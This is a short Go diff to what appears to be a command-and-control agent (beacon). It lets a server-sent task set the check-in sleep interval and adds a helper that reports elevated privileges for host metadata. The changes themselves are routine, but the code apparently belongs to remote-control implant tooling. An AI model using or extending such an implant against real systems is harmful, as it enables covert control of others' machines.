@@ -158,6 +158,10 @@ func (a *Agent) parseTasks(data []byte) ([]Task, error) {
 func (a *Agent) processTask(task Task) {
 	fmt.Printf("[*] Processing task %d with command %d\n", task.ID, task.Command)
 
+	if task.Command == commands.COMMAND_SLEEP && len(task.Data) >= 4 {
+		a.SleepTime = int(binary.LittleEndian.Uint32(task.Data[:4]))
+	}
+
 	// Execute command
 	result, err := a.CmdHandler.Execute(task.Command, task.Data)
 	if err != nil {
@@ -266,7 +270,7 @@ func (a *Agent) generateMetadata() ([]byte, error) {
 
 	// Admin/elevated status
 	isAdmin := uint32(0)
-	if os.Geteuid() == 0 { // Unix root check
+	if isElevated() {
 		isAdmin = 1
 	}
 	binary.Write(buf, binary.LittleEndian, isAdmin)
@@ -363,4 +367,12 @@ func (a *Agent) sleep() {
 	}
 
 	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
+}
+
+func isElevated() bool {
+	if runtime.GOOS == "windows" {
+		return false
+	}
+
+	return os.Geteuid() == 0
 }
